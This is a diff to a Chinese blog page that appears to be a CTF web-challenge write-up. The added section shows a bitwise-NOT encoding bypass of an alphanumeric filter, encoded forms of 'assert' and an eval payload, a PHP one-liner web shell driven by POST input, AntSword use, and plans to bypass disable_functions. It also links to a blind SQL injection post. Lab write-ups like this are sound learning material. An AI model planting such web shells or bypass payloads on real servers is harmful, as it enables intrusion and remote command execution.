@@ -488,6 +488,11 @@ shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></
 <p>(别忘了，文件放在下载里面了)</p>
 <p><img src="6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,666"></p>
 <p>得到flag</p>
+<p>4.1</p>
+<p>整理了下思路，打开看到过滤的情况是[A-Z0-9a-z],所以采用去去翻绕过，先去查看phpinfo,查看过滤了什么函数，发现禁用了我们很多的函数，想去构造一个后门，通过连上蚁剑，去查看flag.<br>assert: %9E%8C%8C%9A%8D%8B<br>(eval($_POST[a])):%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6</p>
+<?php eval($_POST[a]);?>
+
+<p>我刚才又想尝试说直接传入?code=$_POST[a],取反嘛，但是很不幸没有成功。<br>连上蚁剑之后我们可以发现，就是我们想要的东西没有实现，因为我们可以在蚁剑上试一试，就是什么命令都执行不了，所以我们就只能去绕过这个disable_function,上传点是蚁剑的var/tmp，上传之后我们再一次去执行命令</p>
 
   
   
@@ -522,10 +527,10 @@ shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-29T14:39:01+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T15:25:29+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 29, 2021</p>
+    <p>更新于：Apr 1, 2021</p>
   </a>
 </div>
 
@@ -597,6 +602,17 @@ shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></
 
   
     <div class="prev-next">
+      
+        <a class='prev' href='/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>极客大挑战-final-sql</p>
+          <p class='content'>
+
+这是关于盲注的一道题，打算练练这一方面的题目，顺便联系一下写python脚本
+二分法注入，异或注入
+
+其实提示的很明显了。sql盲注
+id=1  NO! Not this! Click ot...</p>
+        </a>
       
       
         <a class='next' href='/2021/03/27/ctfshow-web41/'>
